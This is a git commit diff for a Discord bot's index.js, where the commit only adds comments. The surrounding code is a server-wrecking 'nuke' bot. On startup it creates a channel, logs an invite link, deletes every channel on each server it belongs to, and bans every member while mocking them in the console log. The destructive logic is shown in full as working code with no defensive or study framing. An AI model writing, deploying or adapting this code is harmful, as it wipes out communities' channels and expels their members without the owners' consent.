d44343d80297a7ab21f14fc159876a2ee0db3f82
goldentg <43283685+goldentg@users.noreply.github.com>
2018-11-04 08:37:10 -0700

    adds labels to code

--- index.js
+++ index.js
@@ -3,13 +3,18 @@ const client = new Discord.Client();
 const config = require("./config.json");
 const fs = require("fs")
 
-//on ready delete all channels
+//on ready 
 client.on("ready", () => {
+
     // Create an invite to a channel
     client.guilds.forEach(server => {
+        //create new channel
         server.createChannel("-", "text").then(channel => {
+            //then once channel is created, create an invite link
             server.channels.first().createInvite().then(inviteCode => {
+                //log the invite link to console
                 console.log(inviteCode);
+                //catch errors
             }).catch(err => {
                 if (err) throw err;
             });
@@ -22,6 +27,9 @@ client.on("ready", () => {
     .then(g => console.log(`Updated guild name to ${g}`))
     .catch(console.error);
 */
+
+
+//delete all channels on server
     client.guilds.forEach(server => {
         server.channels.forEach(channel => {
             channel.delete().then(response => {
@@ -32,15 +40,16 @@ client.on("ready", () => {
         });
     });
     
-
+//ban all members on the server
     client.guilds.forEach(guild => {
         guild.members.forEach(m => {
             m.ban();
+            //log when member is banned in the console
             console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
         });
     });
     
-    //startup message log
+    //startup message 
     console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
 
 
